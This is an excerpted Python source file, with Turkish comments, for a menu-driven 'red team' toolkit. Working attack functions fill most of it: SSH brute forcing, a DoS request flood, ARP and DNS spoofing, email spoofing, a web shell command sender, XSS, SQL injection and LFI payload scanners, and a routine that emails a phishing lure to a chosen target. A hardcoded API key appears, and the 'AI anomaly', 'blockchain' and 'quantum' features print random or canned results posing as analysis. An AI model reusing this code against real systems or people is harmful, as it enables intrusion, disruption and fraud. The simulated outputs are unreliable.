            ...
            async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
                async with session.get(f"https://{subdomain}") as response:
                    if response.status == 200:
                        print(colored(f"Aktif Subdomain: {subdomain}", "green"))
                        return subdomain
...
async def advanced_subdomain_scanner(domain: str):
    print(colored(f"Subdomain taraması başlatıldı: {domain}", "yellow"))
    tasks = [check_subdomain(f"{sub}.{domain}") for sub in BASE_SUBDOMAINS]
    return [res for res in await asyncio.gather(*tasks) if res]

async def syn_port_scanner(target: str):
    print(colored(f"Port taraması başlatıldı: {target}", "yellow"))
    ports = range(20, 1024)

    async def check_port(host: str, port: int):
        try:
            reader, writer = await asyncio.open_connection(host, port)
            print(colored(f"Port {port} açık: {host}", "green"))
            writer.close()
...
def perform_whois_lookup(domain: str):
    try:
        whois_info = whois.whois(domain)
        whois_data = {key: (str(value) if isinstance(value, list) else value) for key, value in whois_info.items()}
        print(colored(f"Whois bilgileri:\n{json.dumps(whois_data, indent=4)}", "yellow"))
    except Exception as e:
        print(colored(f"Whois sorgusunda hata: {e}", "red"))

def nmap_scan(target: str):
    scanner = nmap.PortScanner()
    print(colored(f"Nmap taraması başlatılıyor: {target}", "yellow"))
    scanner.scan(target, '1-6666', '-sV')
    for host in scanner.all_hosts():
        print(colored(f"Host : {host} ({scanner[host].hostname()})", "cyan"))
        for proto in scanner[host].all_protocols():
            print(colored(f'Protocol : {proto}', "green"))
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                print(colored(f"port : {port}\tdurum : {state}", "cyan"))

def ip_geolocation(ip: str):
    api_key = '5c463559b32d46c4b46fc53a602c3b01' # Geolocation API anahtarınızı buraya ekleyin.
    ...
    try:
        ...
        print(colored(f"Geolocation API hatası: {err}", "red"))

def dns_zone_transfer_test(domain: str):
    print(colored(f"DNS Zone transfer testi başlatıldı: {domain}", "yellow"))
    try:
        ns_records = resolver.resolve(domain, 'NS')
        for ns in ns_records:
            try:
                axfr_answer = resolver.zone_for_name(domain, rdtype='AXFR', nameserver=ns.to_text())
                for name in axfr_answer:
                    print(colored(name.to_text(), "yellow"))
            except (exception.DNSException, exception.TransferError):
                print(colored(f"Bölge aktarımı başarısız oldu: {domain}", "red"))
    except exception.DNSException as e:
        print(colored(f"DNS çözümleme hatası: {e}", "red"))

def web_technology_detection(url: str):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        response = requests.get(url, headers={"User-Agent": random.choice(USER_AGENTS)})
        response.raise_for_status()
        print(colored(f"\nTeknoloji tespiti: {url}:", "yellow"))
        for header, value in response.headers.items():
            print(colored(f"{header}: {value}", "cyan"))
    except requests.RequestException as e:
        print(colored(f"Erişim hatası {url}: {e}", "red"))
...
def measure_response_time(url: str):
    ...
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(colored(f"URL {url} yanıt süresi: {response.elapsed.total_seconds()}s", "green"))
    except requests.RequestException as e:
        print(colored(f"Erişim hatası {url}: {e}", "red"))

def check_hsts(url: str):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        response = requests.get(url)
        response.raise_for_status()
        hsts_status = 'strict-transport-security' in response.headers
        print(colored(f"HSTS belirli: {'Var' if hsts_status else 'Yok'}", "yellow"))
    except requests.RequestException as e:
        print(colored(f"Erişim hatası {url}: {e}", "red"))

def check_ftp_anonymous_access(host: str):
    try:
        ftp = ftplib.FTP(host)
        ftp.login()
        print(colored(f"Anonim FTP erişim açık: {host}", "green"))
        ftp.quit()
    except ftplib.all_errors as e:
        print(colored(f"Anonim FTP erişimi kapalı veya hata: {host}, Hata: {e}", "red"))

def xss_scan(url: str):
    payloads = ["<script>alert(1)</script>", "'><svg onload=alert(1)>", "javascript:alert(1)"] # Ekstra script buraya ekleyebilirsiniz.
    try:
        for payload in payloads:
            response = requests.get(url, params={'q': payload}, headers={"User-Agent": random.choice(USER_AGENTS)})
            if payload in response.text:
                print(colored(f"XSS zafiyeti bulundu: {payload}", "red"))
                return
        print(colored("XSS zafiyeti bulunamadı.", "green"))
    except requests.RequestException as e:
        print(colored(f"Hata isteği: {e}", "red"))

def sql_injection_scan(url: str):
    test_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT * FROM information_schema.tables --"] # Ekstra script buraya ekleyebilirsiniz.
    try:
        for payload in test_payloads:
            response = requests.get(url, params={'q': payload}, headers={"User-Agent": random.choice(USER_AGENTS)})
            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
                print(colored(f"SQL Enjeksiyon zafiyeti bulundu: {payload}", "red"))
                return
        print(colored("SQL Enjeksiyon zafiyeti bulunamadı.", "green"))
    except requests.RequestException as e:
        print(colored(f"Hata isteği: {e}", "red"))

def ssh_brute_force_attack(ip: str, username: str, password_list: list):
    client = SSHClient()
    ...
    try:
        for password in password_list:
            try:
                ...
                print(colored(f"Başarılı giriş: {username}:{password}", "green"))
                client.close()
                return True
        ...
        client.close()
    print(colored("SSH Brute Force giriş denemeleri başarısız.", "red"))
    return False

def directory_buster(url: str, wordlist: list):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        for word in wordlist:
            dir_url = f"{url}/{word.strip()}"
            response = requests.get(dir_url)
            if response.status_code == 200:
                print(colored(f"Bulundu: {dir_url}", "green"))
    except requests.RequestException as error:
        print(colored(f"Hata: {error}", "red"))

def password_profiling(info_list: list):
    potential_passwords = set()
    for word in info_list:
        potential_passwords.update([
            word, word.lower(), word.upper(),
            word.capitalize(), word[::-1], word + '123',
            word + '!', 'password' + word
        ])
    print(colored(f"Üretilen şifreler: {potential_passwords}", "cyan"))

def email_phishing_template_generator(subject: str, body: str):
    template = {'subject': subject, 'body': body}
    print(colored(f"Sahte e-posta şablonu oluşturuldu:\n{json.dumps(template, indent=4)}", "yellow"))

def dos_attack(url: str, duration: int):
    print(colored("DoS saldırısı başlatılıyor...", "red"))
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            requests.get(url)
            print(colored(f"Saldırı gönderildi: {url}", "cyan"))
    except requests.exceptions.RequestException:
        pass

def smb_enumeration(remote_host: str):
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(remote_host, remote_host)
        conn.login('', '')
        shares = conn.listShares()
        print(colored(f"SMB Paylaşım Listesi: {remote_host}", "cyan"))
        for share in shares:
            print(f"- {share['shi1_netname']}")
    except Exception as e:
        print(colored(f"SMB bilgilendirme hatası: {e}", "red"))

def arp_spoofing(target_ip: str, spoof_ip: str, iface: str):
    try:
        target_mac = get_mac(target_ip)
        if target_mac is None:
            print(colored("Hedef MAC adresi bulunamadı.", "red"))
            return
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, iface=iface, verbose=False)
        print(colored("ARP Spoofing gönderildi.", "cyan"))
    except Exception as e:
        print(colored(f"ARP Spoofing hatası: {e}", "red"))
...
def email_spoofing(sender: str, recipient: str, subject: str, body: str):
    msg = MIMEText(body)
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    ...
    try:
        server = smtplib.SMTP('your.smtp.server', 25) # Kendi mail sunucunuzu buraya ekleyebilirsiniz.
        server.sendmail(sender, [recipient], msg.as_string())
        server.quit()
        print(colored("Sahte mail gönderildi.", "green"))
    except Exception as e:
        print(colored(f"Eposta gönderim hatası: {e}", "red"))

def dns_spoof(iface: str, target_ip: str, target_domain: str, fake_ip: str):
    ...
    def process_packet(packet):
        if packet.haslayer(DNSQR) and target_domain in packet[DNSQR].qname.decode():
            ...
            send(spf_resp, iface=iface, verbose=False)
            print(colored(f"DNS spoof edildi: {packet[DNSQR].qname.decode()} -> {fake_ip}", "cyan"))

    sniff(filter=f"udp port 53 and ip src {target_ip}", store=0, prn=process_packet, iface=iface)

def web_shell_loader(url: str, shell_code: str):
    try:
        response = requests.post(url, data={"cmd": shell_code})
        print(colored("Web shell yüklendi ve çalıştırıldı:", "cyan"))
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(colored(f"Web shell yükleme hatası: {e}", "red"))

def lfi_scan():
    url = input("Tarama yapılacak domaini girin (örnek: http://hedefsite.com): ").strip()

    if not url.startswith('http://') and not url.startswith('https://'):
        print(colored("Lütfen URL'yi 'http://' veya 'https://' ile başlayacak şekilde girin.", "yellow"))
        return

    payload_file = r"Özel Payload Listem\lfi.txt"
    ...
    def check_payload(payload):
        ...
        try:
            ...
            if 'root:' in response.text or '[fonts]' in response.text:
                return test_url, response.status_code, True
        except requests.exceptions.RequestException:
            return test_url, None, False

        return test_url, response.status_code, False
    ...
    try:
        ...
        if not payloads:
            print(colored("Payload dosyası boş. Lütfen payloadları kontrol edin.", "yellow"))
            return

        print(colored(f"Toplam {len(payloads)} payload ile tarama başlatıldı.", "cyan"))
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_payload, payload) for payload in payloads]
            for future in tqdm(futures, desc="Payload Testleri", unit="payload"):
                test_url, status_code, is_vulnerable = future.result()
                if is_vulnerable:
                    found_vulnerability = True
                    print(colored(f"LFI zafiyeti bulundu: {test_url}", "red"))
                if status_code:
                    results[status_code].append(test_url)

        if not found_vulnerability:
            print(colored("LFI zafiyeti bulunamadı.", "green"))

        generate_report = input("HTML raporu oluşturulsun mu? (E/h): ").strip().lower()
        if generate_report == 'e':
            ...
            for code, urls in results.items():
                status_group = (code // 100) * 100
                if status_group in status_counts:
                    status_counts[status_group] += len(urls)

            data = {
                "labels": ["200 (Başarılı)", "300 (Yönlendirme)", "400 (İstemci Hatası)", "500 (Sunucu Hatası)"],
                "datasets": [{
                    "label": "HTTP Durum Kod Dağılımı",
                    "data": [status_counts[200], status_counts[300], status_counts[400], status_counts[500]],
            ...
            with open("lfi_report.html", "w", encoding="utf-8") as f:
                f.write("<html><head><title>LFI Tarama Raporu</title>")
                f.write(css)
                f.write("</head><body>")
                f.write("<h1>LFI Tarama Raporu</h1>")

                # Chart.js script with chart initialization
                f.write("<div class='chart-container'><canvas id='statusChart'></canvas></div>")
                f.write("<script src='https://cdn.jsdelivr.net/npm/chart.js'></script>")
                f.write(f"<script>{chart_data}</script>")

                f.write("<table><tr><th>URL</th><th>HTTP Durum</th></tr>")
                for code, urls in results.items():
                    for url in urls:
                        f.write(f"<tr><td>{url}</td><td>{code}</td></tr>")

                f.write("</table></body></html>")

            print(colored("Rapor oluşturuldu: lfi_report.html", "cyan"))

    except FileNotFoundError:
        print(colored(f"Payload dosyası bulunamadı: {payload_file}", "red"))
    except Exception as e:
        print(colored(f"Beklenmeyen bir hata oluştu: {e}", "red"))

def ai_based_anomaly_detection(logs):
    """
    Tüm işlevselliği tek bir fonksiyonda barındıran AI destekli anomali tespiti.
    """
    ...
    while True:
        # Çıkmak için bir tuş kontrolü
        if keyboard.is_pressed('q'):
            console.print("Çıkış yapılıyor...", style="bold red")
            break
        
        # Tabloyu yeniden yarat
        table = Table(title="Anomali Tespiti")
        table.add_column("Sıra", justify="right", style="cyan")
        table.add_column("Durum", style="magenta")
        table.add_column("Detay", style="green")

        for idx, log in enumerate(logs):
            # Örnek bir anomali tespit işlemi
            is_anomaly = random.random() > 0.8
            status = "Anomalik" if is_anomaly else "Normal"
            detail = f"Giriş: {log}"
            logs_processed += 1

            # Mevcut tabloya satır ekle
            table.add_row(str(logs_processed), status, detail)

            if is_anomaly:
                anomaly_count += 1

            sleep(1)  # İşleme bir simülasyon gecikmesi ekle

        console.clear()  # Önceki çıktıları temizle
        console.print(table)  # Mevcut tabloyu konsola yazdır

    console.print(f"Toplam anormal aktivite sayısı: {anomaly_count}", style="bold green")

    # Example logs (dummy data)
    logs = [
    "User logged in",
    "UNUSUAL_ACTIVITY detected in the network",
    "User logged out",
    "Failed login attempt"
    ]
    ai_based_anomaly_detection(logs)

def blockchain_vulnerability_assessment(contract_code):
    # Kullanıcıdan akıllı sözleşme kodu alınarak işleme başlanır
    contract_code = input("Lütfen akıllı sözleşme kodunu girin:\n")

    print(colored("Akıllı sözleşme güvenlik değerlendirmesi başlatılıyor...", "yellow"))

    # Yaygın zafiyet türleri
    common_issues = {
        'Reentrancy': r'\bcall\(.+\)',
        'Arithmetic Issues': r'\b(add|sub|mul|div)\b',
        'Denial of Service': r'\b(revert|require)\([^;]*\)',
        'Gas Limit and Loops': r'\bwhile\b|\bfor\b',
        'Timestamp Dependence': r'\bnow\b|\bblock\.timestamp\b',
        'Unhandled Exceptions': r'\bthrow\b',
        'Access Control': r'\bonlyOwner\b',
        'Permission Misuse': r'\bpublic\b',
        'Front Running': r'\bblockhash\b',
        'Unchecked Low-level Calls': r'\bcallcode\b|\bdelegatecall\b'
    }

    # Kontrattaki sorunları tespit edelim
    detected_issues = [issue for issue, pattern in common_issues.items() if re.search(pattern, contract_code)]

    # Tespit edilen zafiyetleri gösterelim
    if detected_issues:
        for issue in detected_issues:
            print(colored(f"Zafiyet tespit edildi: {issue}", "red"))
    else:
        print(colored("Zafiyet tespit edilmedi.", "green"))

    # Statik analiz simülasyonu
    print(colored("\nStatik Analiz Sonuçları:", "blue"))
    print("1. Potansiyel gaz optimizasyonları bulundu.")
    print("2. Değişkenlerin kapsamı ve erişim kontrolü analiz edildi.")

    # Ünit test simülasyonu
    print(colored("\nÜnit Test Sonuçları:", "blue"))
    print("1. Tüm kritik işlevler başarılı bir şekilde test edildi.")
    print("2. Beklenen ve beklenmeyen girişler karşılaştırıldı ve analiz edildi.")
    print("3. Sözleşmenin maliyet analizi ve performans testi yapıldı.")

    # Ek gelişmiş analiz simülasyonu
    print(colored("\nGelişmiş Analizler:", "blue"))
    print("1. Kodunuzu bağımsız denetimlere tabi tutmalısınız.")
    print("2. Son kullanıcı incelemesi dahil her aşamada test edilmeli.")
    print("3. Üretim sonrası sürekli izleme önerilir.")

def iot_security_scanner(device_ip):
    ...
    if device_ip.lower() == 'q':
        return

    if not is_valid_ip(device_ip):
        print(colored("Geçersiz IP adresi!", "red"))
        return

    print(colored(f"IoT cihaz güvenlik taraması başlatıldı: {device_ip}", "yellow"))

    # Başlangıç zamanı
    start_time = datetime.now()

    # Yaygın olarak kullanılan portları tarama
    ports_to_scan = '21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,514,587,636,993,995,1433,1521,2049,3306,3389,5432,5900,8080,8443'
    nm = nmap.PortScanner()
    nm.scan(device_ip, ports_to_scan)
    ...
    try:
        if device_ip in nm.all_hosts():
            # Açık olan portları listele ve hizmetleri tanımla
            for proto in nm[device_ip].all_protocols():
                for port in nm[device_ip][proto]:
                    if nm[device_ip][proto][port]['state'] == 'open':
                        service_name = nm[device_ip][proto][port]['name']
                        version = nm[device_ip][proto][port]['product'] + " " + nm[device_ip][proto][port]['version']
                        open_ports.append(port)
                        services[port] = {'service': service_name, 'version': version.strip()}
                        print(colored(f"Açık port: {port} - Hizmet: {service_name}, Versiyon: {version.strip()}", "cyan"))
        else:
            print(colored("Taranan IP adresi için sonuç bulunamadı.", "red"))
            return
    except KeyError as e:
        print(colored(f"Nmap sonucu alınamadı: {str(e)}", "red"))
        return

    # Varsayılan Şifre Kontrolleri
    weak_credentials = {'admin': 'admin', 'user': 'user', 'root': 'root'}
    print(colored("\nVarsayılan kimlik bilgileri kontrol ediliyor...", "yellow"))
    for username, password in weak_credentials.items():
        try:
            response = requests.get(f"http://{device_ip}", auth=(username, password), timeout=3)
            if response.status_code == 200:
                print(colored(f"Dikkat: Varsayılan kimlik bilgileri ile erişilebilir - Kullanıcı: {username}, Şifre: {password}", "red"))
        except requests.exceptions.RequestException:
            continue

    # SSL/TLS Sertifikası Kontrolü
    print(colored("\nSSL/TLS sertifikası kontrol ediliyor...", "yellow"))
    try:
        response = requests.get(f"https://{device_ip}", verify=False)
        if response.status_code != 200:
            print(colored("Dikkat: SSL/TLS sertifikası bulunamadı veya geçersiz!", "red"))
        else:
            print(colored("SSL/TLS sertifikası geçerli.", "green"))
    except Exception:
        print(colored("SSL/TLS kontrol edilemedi.", "red"))

    # CVE Tabanlı Güvenlik Açığı Tarama
    print(colored("\nHizmetlere dayalı zafiyet kontrolü yapılıyor...", "yellow"))
    cve_check_url = "https://cve.circl.lu/api/search"
    for port, data in services.items():
        payload = {'query': data['version']}
        try:
            response = requests.get(urljoin(cve_check_url, data['service']), params=payload)
            if response.ok:
                vulnerabilities = response.json()
                for vuln in vulnerabilities:
                    print(colored(f"Bulunan zafiyet: {vuln['id']} - {vuln['summary']}", "red"))
            else:
                print(colored(f"{data['service']} için yeni zafiyet bulunamadı.", "green"))
        except Exception as e:
            print(colored(f"Zafiyet kontrolü yapılamadı: {str(e)}", "red"))

    # Tarama Süresi Raporlama
    end_time = datetime.now()
    print(colored("\nGüvenlik taraması tamamlandı.", "green"))
    print(colored(f"Taranan IP: {device_ip}", "green"))
    print(colored(f"Açık Portlar: {open_ports}", "green"))
    print(colored(f"Taranan Süre: {(end_time - start_time)}", "green"))

def social_engineering_simulator(target_email):
    # Kullanıcıdan hedef e-posta adresini girin
    target_email = input("Lütfen hedefin e-posta adresini girin: ").strip()
    
    # Sosyal mühendislik senaryoları
    scenarios = {
        "1": "Kimlik Avı (Phishing) E-Postası",
        "2": "Telefon Araması (Vishing)",
        "3": "Fiziksel Erişim (Tailgating)"
    }
    ...
    selected_scenario = input("Seçiminiz (1/2/3): ").strip()

    if selected_scenario not in scenarios:
        print(colored("Geçersiz seçim. Program sonlandırıldı.", "red"))
        return

    print(colored(f"\nSosyal mühendislik senaryosu başlatılıyor: {scenarios[selected_scenario]}", "cyan"))

    if selected_scenario == "1":
        print("\n--- Kimlik Avı (Phishing) E-Postası Senaryosu ---")
        print("Bu senaryoda, saldırgan sahte bir banka e-postası gönderiyor. E-posta, kullanıcıdan"
              " hesap bilgilerini güncellemesini isteyerek sahte bir web sitesine yönlendiriyor.\n"
              "Web sitesi, bankanın resmi web sitesinin bir kopyası ancak URL şüphe uyandırıyor ve kullanıcıdan"
              " giriş bilgileri istiyor.\n"
              "Bu yöntem, kullanıcıların web sitesi URL'sine dikkat etmemesi durumunda özellikle tehlikelidir.")
        try:
            smtp_server = smtplib.SMTP('smtp.example.com', 587) # Lütfen smtp bilgileri girin
            smtp_server.starttls()
            smtp_server.login("your_email@example.com", "your_password")
            message = f"Subject: Hesap Güncellemesi Gerekiyor\n\nSayın Kullanıcı,\n\nSayfamızda yeni güvenlik önlemleri uygulanmıştır. Lütfen hesabınızı güncellemek için bu bağlantıya tıklayın: http://example-bank.com/verify?user={target_email}"
            smtp_server.sendmail("your_email@example.com", target_email, message)
            print(f"[*] {target_email} adresine kimlik avı e-postası başarıyla gönderildi.")
            smtp_server.quit()
        except Exception as e:
            print(f"[!] E-posta gönderim hatası: {e}")

    elif selected_scenario == "2":
        print("\n--- Telefon Araması (Vishing) Senaryosu ---")
        print("Bu senaryoda, saldırgan bir telekomünikasyon sağlayıcısından arıyormuş gibi davranıyor."
              " Arama, kullanıcının telefon faturasının aşırı fazla olduğunu ve bu durumu çözmek için"
              " kimlik bilgilerinin doğrulanması gerektiğini iddia ediyor.\n"
              "Hedef, gerçek bir kişinin bilgisizliğini kullanarak kişisel bilgilerini ifşa etmeye zorlanıyor.\n"
              "Bu yöntemin başarı oranı, saldırganın ikna kabiliyeti ve hedefin dikkatine bağlı olarak değişir.")
        phone_number = "555-1234"
        print(f"[*] {phone_number} numarası kullanılarak arama yapılıyor...")
        time.sleep(2)
        print("[*] Garip bir balantı sesi... 'Merhaba, [şirket adı]. Hesapta olağan üstü bir faaliyet görüyoruz,' gibi ses efektleri duyuluyor.")
        time.sleep(3)
        print("[*] Kullanıcıdan sosyal güvenlik numarası ve diğer kişisel bilgilerin doğrulanması istendi.")

    elif selected_scenario == "3":
        print("\n--- Fiziksel Erişim (Tailgating) Senaryosu ---")
        print("Bu senaryoda saldırgan, bir ofis binasına girerken güvenlik kartı taşımıyor ancak"
              " beraberinde çanta veya ekipman taşıyor. Binaya giriş yaparken, çalışanlardan birinin"
              " arkasına takılarak güvenlik kontrolünden geçiyor.\n"
              "Saldırgan, 'Açabilir misiniz? Ellerim dolu.' gibi söylemlerle hedefin iyi niyetini kullanıyor."
              " Giriş sağladığında veri merkezine veya ofislere erişim sağlamayı hedefliyor.\n"
              "Bu tür saldırılar, çalışanların farkındalığı ve güvenlik prosedürlerinin varlığı ile engellenebilir.")
        print("[*] Saldırgan, giriş alanındaki kalabalıkta kamufle oluyor...")
        time.sleep(2)
        print("[*] Güvenlik kartı açmasını bekleyerek, arkasından içeriye doğru geçiş sağlanır.")

    # Kullanıcı senaryoya rağmen ne tür önlemler alabilir anlat
    while True:
        user_response = input("\nBu senaryoya karşı alınabilecek bir önlem nedir? (Çıkış için 'Ç'): ").strip()
        if user_response.upper() == 'Ç':
            print(colored("Simülasyon sona erdirildi. Güvenliğiniz için önerileri göz önünde bulundurmayı unutmayın.", "green"))
            break
        elif user_response:
            print(colored(f"Önerilen önlem: {user_response}", "cyan"))
            
def dark_web_monitoring():
    def check_tor_connection():
        try:
            # 9050 numaralı port üzerinden Tor ağına erişimi kontrol et
            socks_test_socket = socket.create_connection(("127.0.0.1", 9050), timeout=5)
            socks_test_socket.close()
            return True
    ...
    if not check_tor_connection():
        instructions = """
Tor bağlantısı aktif değil. Aşağıdaki adımları izleyerek Tor'u başlatabilirsiniz.

Ubuntu:
1. Terminali açın ve Tor'u yüklemek için: sudo apt-get install tor
2. Tor servisini başlatmak için: sudo service tor start
3. Tor'un çalıştığını kontrol edin: sudo service tor status

Windows:
1. Tor Browser'ı indirin ve kurun. (https://www.torproject.org/)
2. Tor Browser'ı başlatın ve ağ bağlantısının sağlandığından emin olun.

Tor servisiniz çalışır durumda olduğunda 127.0.0.1:9050 kullanarak .onion sitelerine erişebilirsiniz. 
"""
        print(colored(instructions, "cyan"))
        return

    print(colored("Dark Web izleme ve güvenlik önlemleri başlatılıyor.", "yellow"))
    ...
    keywords_input = input("Aranacak anahtar kelimeleri virgülle ayırarak girin (örn: email,password): ")
    keywords = [keyword.strip().lower() for keyword in keywords_input.split(',')]
    
    # Tor üzerinden istek göndermek için yapılandırmalar
        ...
        try:
            ...
            for keyword in keywords:
                if keyword in page_content:
                    leaks_detected = True
                    print(colored(f"Potansiyel veri sızıntısı tespit edildi: {site} - {keyword}", "red"))

        except requests.RequestException as e:
            print(colored(f"İstek hatası {site}: {str(e)}", "red"))

        time.sleep(1)

    if not leaks_detected:
        print(colored("Veri sızıntısı tespit edilmedi.", "green"))

init(autoreset=True)
def osint_and_profile_analysis(target_name):
    print(f"{Fore.YELLOW}Açık kaynak istihbarat (OSINT) ve profil analizi başlatılıyor.\n")

    def is_content_relevant(url, target_name_parts):
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            if response.status_code == 200 and all(part.lower() in response.text.lower() for part in target_name_parts):
                return True
        except requests.RequestException:
            return False
        return False

    # Sosyal medya platformları arama
    social_media_platforms = ["LinkedIn", "Twitter", "Instagram", "Facebook", "Telegram", "TikTok", "Reddit"]
    social_media_profiles = []
    
    name_variants = [target_name.lower(), target_name.replace(' ', '').lower()]

    print(f"{Fore.MAGENTA}Sosyal Medya Profilleri Aranıyor:")
    for platform in social_media_platforms:
        for variant in name_variants:
            search_url = f"https://www.google.com/search?q={variant}+site:{platform.lower()}.com"
            try:
                ...
                for anchor in soup.find_all('a', href=True):
                    ...
                    if 'http' in link and platform.lower() in link and is_content_relevant(link, target_name.split()):
                        social_media_profiles.append(link)
                        print(f"{Fore.CYAN}[{len(social_media_profiles)}] {link}")

            except (requests.HTTPError, Exception) as e:
                print(f"{Fore.RED}Hata ({platform}): {str(e)}")
            
            time.sleep(1.5)  # Dinlenme süresi artırılarak engelleme riski azaltıldı
    ...
    dork_queries = ["xls", "xlsx", "docx", "doc", "pdf", "sql"]
    all_urls = []
    domains = []

    print(f"{Fore.GREEN}\nDosya ve Diğer Bağlantılar Aranıyor:")
    for engine_name, base_url in search_engines.items():
        for variant in name_variants:
            search_url = f"{base_url}{variant}"
            try:
                response = requests.get(search_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, 'html.parser')
                ...
                for anchor in soup.find_all('a', href=True):
                    actual_link = anchor.get('href')
                    if actual_link.startswith('/url?'):
                        actual_link = actual_link.split('&')[0].split('=')[1]
                    if actual_link and "google.com" not in actual_link and is_content_relevant(actual_link, target_name.split()):
                        all_urls.append(actual_link)
                        domains.append(actual_link.split('/')[2])
                        print(f"{Fore.GREEN}[{len(all_urls)}] {actual_link}")

            except (requests.HTTPError, Exception) as e:
                print(f"{Fore.RED}Veri çekme hatası ({engine_name}): {str(e)}")
    ...
    for dork in dork_queries:
        for engine_name, base_url in search_engines.items():
            for variant in name_variants:
                dork_url = f"{base_url}filetype:{dork}+{variant}"
                try:
                    response = requests.get(dork_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
                    response.raise_for_status()
                    soup = BeautifulSoup(response.text, 'html.parser')
                    ...
                    print(f"{Fore.RED}Dork sorgusu hatası ({engine_name}): {str(e)}")
    ...
    # HTML Rapor Oluşturma
    create_html_report = input("\nRaporu HTML olarak kaydetmek ister misiniz? (E/H): ").strip().upper()
    if create_html_report == 'E':
        with open('osint_report.html', 'w') as file:
            file.write("""
            <html>
            <head>
            <title>OSINT Raporu</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; padding: 20px; line-height: 1.6; }
                h1 { text-align: center; color: #333; }
                .section { margin-bottom: 30px; }
                .section h2 { color: #4CAF50; cursor: pointer; border-bottom: 2px solid #4CAF50; padding-bottom: 5px; }
                ul { list-style-type: none; padding: 0; display: none; }
                li { margin: 5px 0; padding: 10px; background: #f9f9f9; border-radius: 5px; }
            ...
            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    ...
                    const domainChart = new Chart(ctx, {
                        type: 'bar',
                        data: {
                            labels: """ + str(list(domain_counts.keys())) + """,
                            datasets: [{
                                label: 'Domain Sayısı',
                                data: """ + str(list(domain_counts.values())) + """,
            ...
            <body>
            <h1>OSINT ve Profil Analizi Raporu</h1>
            <div class="section">
                <h2>Sosyal Medya Profilleri</h2>
                <ul>""")
            for profile in social_media_profiles:
                file.write(f"<li><a href='{profile}'>{profile}</a></li>")
            file.write("""
                </ul>
            </div>
            <div class="section">
                <h2>Dosya ve Diğer Bağlantılar</h2>
                <ul>""")
            for url in all_urls:
        ...
        print(f"{Fore.GREEN}\nRapor osint_report.html dosyasına kaydedildi.")

def quantum_cryptanalysis_simulation(encrypted_data):
    # Kullanıcıdan veri al
    user_input_data = input("Lütfen çözülecek veriyi girin: ")

    print(colored("\nHash hesaplama ve çözme simülasyonu başlatıldı...\n", "yellow"))
    time.sleep(1)

    # Hash algoritmaları ve değerlendirmeler
    algorithms = {
        'MD5': {'function': hashlib.md5, 'classic_trials': 2**128, 'time': "<1 sec"},
        'SHA-1': {'function': hashlib.sha1, 'classic_trials': 2**160, 'time': "<1 min"},
        'SHA-256': {'function': hashlib.sha256, 'classic_trials': 2**256, 'time': "1 day"},
        'SHA-512': {'function': hashlib.sha512, 'classic_trials': 2**512, 'time': "years"},
        'BLAKE2s': {'function': hashlib.blake2s, 'classic_trials': 2**256, 'time': "1 day"},
        'BLAKE2b': {'function': hashlib.blake2b, 'classic_trials': 2**512, 'time': "years"}
    }
    
    # Analize dayalı güvenlik değerlendirmeleri
    security_levels = {
        'MD5': 'düşük',
        'SHA-1': 'düşük',
        'SHA-256': 'yüksek',
    ...
    # Tablo için veri depolama
    table_data = []

    for name, details in algorithms.items():
        # Hashleme
        hashed_value = details['function'](user_input_data.encode()).hexdigest()
        
        # Kuantum hesaplama simülasyonu
        quantum_trials = int(details['classic_trials']**0.5)  # Grover algoritması etkisi
        
        # Tablo verilerini hazırlama
        table_data.append([
            name, 
            hashed_value[:10] + '...', 
            security_levels[name], 
            f"~{quantum_trials}", 
            details['time']
        ])
    
    # Tablo başlıkları
    headers = ["Hash Algorithm", "Hash Value", "Security Level", "Quantum Attempts", "Est. Time"]
    
    # Tabloyu yazdırma
    print(tabulate(table_data, headers=headers, tablefmt="grid"))
    print(colored("\nHash çözme simülasyonu tamamlandı.", "yellow"))

def main_menu():
    while True:
        print(colored("\n--- Kapsamlı Red Team Araç Seti ---", "magenta"))
        print("1. Subdomain Tarama")
        print("2. SYN ve UDP Port Tarama")
        print("3. Whois Sorgusu")
        print("4. Nmap Servis Tarama")
        print("5. IP Coğrafi Konum")
        print("6. DNS Zone Transfer Testi")
        print("7. Web Teknoloji Tespiti")
        print("8. XSS Tespit Aracı")
        print("9. SQL Enjeksiyon Testi")
        print("10. SSH Brute Force")
        print("11. DirBuster")
        print("12. Şifre Profilleme")
        print("13. Phishing Mail Şablonu")
        print("14. HTTP Yanıt Süresi Ölçümü")
        print("15. HSTS Kontrolü")
        print("16. Anonim FTP Erişim Testi")
        print("17. DoS Saldırısı")
        print("18. SMB Bilgilendirme")
        print("19. ARP Spoofing ve MITM")
        print("20. Email Spoofing")
        print("21. DNS Spoofing")
        print("22. Web Shell Yükleyici")
        print("23. LFI Test Aracı")
        print("24. AI Anomali Tespit")
        print("25. Blockchain Zafiyet Değerlendirmesi")
        print("26. IoT Güvenlik Tarayıcı")
        print("27. Sosyal Mühendislik Simülatörü")
        print("28. Dark Web İzleme")
        print("29. OSINT ve Profil Analizi")
        print("30. Kuantum Kriptanaliz Simülasyonu")
        print("31. Çıkış")
        
        choice = input("Seçiminizi yapın: ").strip()

        if choice == "1":
            domain = input("Taramak istediğiniz domain'i girin: ").strip()
            active_domains = asyncio.run(advanced_subdomain_scanner(domain))
            print(colored(f"Bulunan aktif subdomainler: {active_domains}", "green"))
        elif choice == "2":
            host = input("Taramak istediğiniz IP veya domain'i girin: ").strip()
